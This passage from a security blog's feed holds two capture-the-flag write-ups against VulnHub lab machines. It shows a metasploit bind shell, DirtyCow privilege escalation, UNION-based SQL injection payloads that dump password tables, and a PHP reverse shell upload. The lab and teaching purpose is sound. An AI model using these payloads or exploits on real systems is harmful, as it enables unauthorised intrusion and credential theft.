+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ &lt;span class=&quot;token function&quot;&gt;zip&lt;/span&gt; bind-meterpreter bind-meterpreter.php &lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;  adding: bind-meterpreter.php &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deflated &lt;span class=&quot;token number&quot;&gt;62&lt;/span&gt;%&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;br&gt;
+#### Target Infiltration  
+&lt;p&gt;With the exploit ready, I started a metasploit session and opened a multi/handler to connect to the bind shell.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ msfconsole&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;msf5 &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; use multi/handler&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;msf5 exploit&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;multi/handler&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; LHOST &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.130&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;LHOST &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.130&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;msf5 exploit&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;multi/handler&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; RHOST &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.132&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;RHOST &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.132&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;msf5 exploit&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;multi/handler&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; LPORT &lt;span class=&quot;token number&quot;&gt;4448&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;LPORT &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4448&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;msf5 exploit&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;multi/handler&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; payload php/meterpreter/bind_tcp&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;payload &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; php/meterpreter/bind_tcp&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I set the necessary LPORT, LHOST, RHOST, and payload options. Before I launched the handler, I browsed the payload on the target website to initiate the bind shell. Once the payload loaded, I ran the handler and received the shell.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ msf5 &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;msf5 exploit&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;multi/handler&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; run&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Started &lt;span class=&quot;token builtin class-name&quot;&gt;bind&lt;/span&gt; TCP handler against &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.132:4448&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;38288&lt;/span&gt; bytes&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; to &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.132&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Meterpreter session &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; opened &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0.0&lt;/span&gt;.0.0:0 -&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.132:4448&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; at &lt;span class=&quot;token number&quot;&gt;2020&lt;/span&gt;-05-12 00:43:47 -0400&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;col-sm mt-3 mt-md-0&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni8.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;caption&quot;&gt;
+    Receiving a shell on the metasploit multi/handler 
+&lt;/div&gt;    
+&lt;p&gt;I spent some time running through meterpreter enumeration scripts to gather more details on the target. Once I gathered enough information, I dropped into a shell to run some linux privilege escalations scripts. Using the shell command, I dropped into a low interactive shell. To upgrade, I ran the following exports and used a simple python script to open up a bash shell.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ meterpreter &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; shell&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Process &lt;span class=&quot;token number&quot;&gt;2181&lt;/span&gt; created.&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Channel &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; created.&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;TERM&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;xterm&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;SHELL&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;bash&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;PATH&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;python -c ‘import pty&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;pty.spawn&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;“/bin/bash”&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;’&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;www-data@vulnuni:/root@kali$&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With a better shell, I did some manual navigating on the target and came across a flag in the vulnuni/home directory.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;www-data@vulnuni$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Desktop    Downloads  Pictures  Templates  examples.desktop&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Documents  Music      Public    Videos     flag.txt&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;www-data@vulnuni:/home/vulnuniwww-data@vulnuni$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; flag.txt&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; flag.txt&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;68fc668278d9b0d6c3b9dc100bee181e&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Next, I opened up a webserver on my Kali linux machine to easily transfer some privilege escalation scripts to the target. I copied these scripts from my redteam-apache-toolkit project to my webserver at /var/www/html . I used wget on the target to transfer the scripts into the /tmp folder. One of the privilege escalation/ enumeration scripts I ran was BeRoot. The output showed that this target was vulnerable to the dirty cow linux kernel privilege escalation exploit.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;col-sm mt-3 mt-md-0&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni9.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;caption&quot;&gt;
+    The output of the BeRoot exploit suggestion script
+&lt;/div&gt;      
+&lt;p&gt;There are several dirty cow exploits available, each one uses a slightly different method of triggering the exploit. The GitHub wiki pages includes a list of POC’s. I tried a few of these however running the exploit caused the target VM to crash, a common problem experienced when using dirty cow. The best option I found was to use the SUID-based root exploit cowroot. I copied the POC to my machine, compiled it with gcc, and then transferred it to the target with wget.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ root@kali:~/Desktop&lt;span class=&quot;token comment&quot;&gt;# gcc -pthread cowroot.c -o cowroot &lt;/span&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With the exploit on the target machine, I made it executable with chmod and executed it. The dirty cow exploit upgraded my limited www-data shell to a full root shell. I quickly read the flag in the root directory with cat.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ msf &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;meterpreter &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; shell&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Process &lt;span class=&quot;token number&quot;&gt;2241&lt;/span&gt; created.&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Channel &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; created.&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;TERM&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;xterm&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;SHELL&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;bash&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;PATH&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;python -c ‘import pty&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;pty.spawn&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;“/bin/bash”&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;’&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;www-data@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzippingroot@kali$ ./cowroot&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;./cowroot&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;DirtyCow root privilege escalation&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Backing up /usr/bin/passwd to /tmp/bak&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Size of binary: &lt;span class=&quot;token number&quot;&gt;42824&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Racing, this may take a while&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;/usr/bin/passwd overwritten&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Popping root shell.&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Don’t forget to restore /tmp/bak&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;thread stopped&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;thread stopped&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping&lt;span class=&quot;token comment&quot;&gt;# cat /root/flag.txt&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; /root/flag.txt&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;ff19f8d0692fe20f8af33a3bfa6635dd&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping&lt;span class=&quot;token comment&quot;&gt;# whoami&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token function&quot;&gt;whoami&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;root&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping&lt;span class=&quot;token comment&quot;&gt;# id&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token function&quot;&gt;id&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token assign-left variable&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;,33&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping&lt;span class=&quot;token comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;col-sm mt-3 mt-md-0&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni10.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;caption&quot;&gt;
+    Reading the final flag with root permission
+&lt;/div&gt;      
+&lt;p&gt;Overall this was a good CTF challenge and taught me a little more about linux kernel privilege escalation exploits. Not all dirty cow exploits are the same, and many can cause virtual linux machines to crash. Additionally, the authors personal infosec posts is a good read and can be found at &lt;a href=&quot;https://emaragkos.gr/&quot;&gt;https://emaragkos.gr&lt;/a&gt;.&lt;/p&gt;
+</content>
+  </entry>
+  
+  
+  <entry>
+    <title>Hackeme CTF Writeup</title>
+    
+    <link href="https://tbutler.org/posts/2020/06/hackme-ctf-writeup/" rel="alternate" type="text/html"/>
+    
+    <updated>2020-06-02T00:00:00-04:00</updated>
+    <id>https://tbutler.org/posts/2020/06/hackme-ctf-writeup/</id>
+    <content type="html">&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/2-dirbuster.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;br&gt;
+&lt;p&gt;Hackme is a CTF challenge which primarily focuses on web application testing. The challenge can be downloaded from VulnHub. To complete this challenge, I used VMware Fusion for virtualization and Kali Linux as my attack machine. Overall, hackme tested a small base of web application testing skills like SQL injection, malicious file upload, and privilege escalation. This CTF has no flags, and the goal is to obtain low-priv user access and ultimately escalate to root.&lt;/p&gt;
+&lt;h3 id=&quot;getting-started&quot;&gt;Getting Started&lt;/h3&gt;
+&lt;p&gt;To start the challenge, I downloaded the hackme OVA image and loaded it into VMware. I launched both my attack and virtual machine on the same local network, logged into my attack machine, and tested the connection with arp-scan. After receiving packets from the target machine, it was time to get started. The first step was to go through the usual enumeration scripts to get the target’s ip and check what services and ports were running. I used arp-scan to find the IP.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ arp-scan -l
+&lt;/code&gt;&lt;/pre&gt;
+&lt;br&gt;
+&lt;h3 id=&quot;port-and-service-enumeration&quot;&gt;Port and Service Enumeration&lt;/h3&gt;
+&lt;p&gt;Arp-scan showed the targets IP was 192.168.8.129. The next step was to start enumerating what ports were open on the target and determine the running services. I used a basic nmap scan to brush the surface.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nmap 192.168.8.129
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Next I ran a more intensive nmap scan. This takes a bit longer to complete so I do this in a separate tab. Additionally I scanned for UDP ports just in case&amp;lt;&lt;/p&gt;
+&lt;h3 id=&quot;web-application-testing&quot;&gt;Web Application Testing&lt;/h3&gt;
+&lt;p&gt;Now that I’ve found some services, it was time to take a deeper look into specefic ones. Since apache was running on port 80, I started with web server enumeration. First, I launched dirbuster to brute force a list of webpages running on the server.&lt;/p&gt;
+&lt;p&gt;In dirbuster, I entered the target as &lt;a href=&quot;http://192.168.8.129/&quot;&gt;http://192.168.8.129&lt;/a&gt;. I set the payload to the /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt wordlist.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/2-dirbuster.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;The above image shows directories found by dirbuster. There was many php pages, which was noted for later. Additionally, the uploads folder was interesting, although initially I did not have the correct authorization to visit the section, this could be useful later on.&lt;/p&gt;
+&lt;p&gt;As dirbuster was running in the background, I did a manual inspection of the website in my browser. The homepage for the website gave the option to log in. First, I tried some common XSS and SQLi attacks to see if this form was susceptible to easy compromises.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&#39; or 1=1 limit 1;#&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;br&gt;
+### SQL Injection
+&lt;p&gt;An easy compromise was not available, so I clicked the link to create my own account with the credential’s username: hacker, password: hacker. Logging into the website with the new account, I now had access to a search field in a book catalog.&lt;/p&gt;
+&lt;p&gt;With a new search field, I tried again with common SQLi attacks. I had minimal success here until I tried the following script.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&#39; 1=1 limit2;#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This simple SQL injection showed the search field is vulnerable because I was able to directly run a sequel command to only show 2 results. This shows user input is not sanitized, and that I will be able to run any SQL command I want. From here, I started to run through the standard process of manual database enumeration. The first step was to test how many columns were in the current table. To test this, I iterated the following SQL injection script, adding an additional field by 1&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&#39; or 1=1 UNION SELECT 1;#
+&#39; or 1=1 UNION SELECT 1,2;#
+&#39; or 1=1 UNION SELECT 1,2,3;#
+&#39; or 1=1 UNION SELECT 1,2,3,4;#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When N increased to 4, the application broke, indicating there were only 3 columns.&lt;/p&gt;
+&lt;div class=&quot;wp-block-image&quot;&gt;&lt;figure class=&quot;aligncenter size-large is-resized&quot;&gt;&lt;img src=&quot;https://i2.wp.com/siddfinch.org/wp-content/uploads/2020/06/4-SQL-database-enumeration.png?fit=1024%2C826&amp;amp;ssl=1&quot; alt=&quot;&quot; class=&quot;wp-image-350&quot; width=&quot;768&quot; height=&quot;620&quot;&gt;&lt;/figure&gt;&lt;/div&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/4-SQL-database-enumeration.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Now that I knew there were only 3 columns, I could test to see if any fields were injectable. Looking at the output of the “union all select 1,2,3”, it seemed that the very last column is injectable because the output was “2”.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/5-SQLi-proof.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;The next step in enumerating the database is to test different injectable commands to gather additional information such as tables names, columns within those tables, database version, etc. To gather that information, I ran the following commands.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# database user permission
+&#39; or 1=1 UNION SELECT 1,user(),3;#
+# database version
+&#39; or 1=1 UNION SELECT 1,@@version,3;#
+# database type
+&#39; or 1=1 UNION SELECT 1, database(),3;#
+# table names
+&#39; or 1=1 UNION SELECT 1,group_concat(TABLE_NAME,0x0a),3 from information_schema.tables where table_schema=database();#
+# columns in user table
+&#39; or 1=1 UNION SELECT 1,group_concat(column_name,0x0a),3 from information_schema.columns where table_name=&#39;users&#39;;#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Using these commands, I was able to determine the database had two tables for books and users. I used the column name enumeration command to see what information was available. The output showed usernames and passwords were stored in the users table.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/6-SQLi-enumeration-usercolumns.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Finally, I dumped all the usernames and passwords from the database with the following command.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;or 1=1 UNION SELECT 1,group_concat(name,0x0a,password ),3 from information_schema.tables where table_name=&#39;users&#39;;#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;br&gt;
+### Hash Cracking
+&lt;p&gt;The passwords were stored as a hash, so I wasn’t able to use them right away. Before attempting to crack the hashes, I use hash-identifier to see which kind they were.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ hash-identifier
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Hash-identifier showed these were most likely MD5 hashes. For my first attempt to uncover the raw text passwords, I used findmyhash, a program which checks the hashes against already known hashes.&lt;/p&gt;
+&lt;p&gt;The program was unable to find the passwords. I then proceeded to attempt to crack the hashes with programs like john and hashcat, but after some system difficulties I changed course. I was finally able to find raw text passwords by using the website &lt;a href=&quot;https://hashkiller.co.uk/&quot;&gt;hashkiller&lt;/a&gt;. Entering the hashes into the search bar, the website was able to find matches to previously computed hashes.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/9-hashkiller.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Now armed with usernames and raw text passwords, I logged into the site as the user “superadmin” and password “Uncrackable”. This directed me to the admin page of the website.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/10-welcomeadmin.png?&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;I noticed the welcomeadmin page had an uploads section, so the first thing I tried was to upload my favorite reverse shell php backdoor script, courtesy of the &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;pentestmonkeys&lt;/a&gt;. Prior to uploading the script to the website, I edited the exploit so that the reverse shell would come to my attack machine IP and at port 4447.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/11-edit-exploit.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;With the exploit ready to go, I uploaded it to the admin portal. I made sure my attack machine was ready to receive the reverse shell using ncat.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nc -nlvp 4447
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I then uploaded the script. To launch the exploit, I navigated to the upload’s directory at /uploads/php-reverse-shell.php . This directory was originally found in my webserver enumeration scans with dirb. After launching the page with the exploit, I received the reverse shell.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
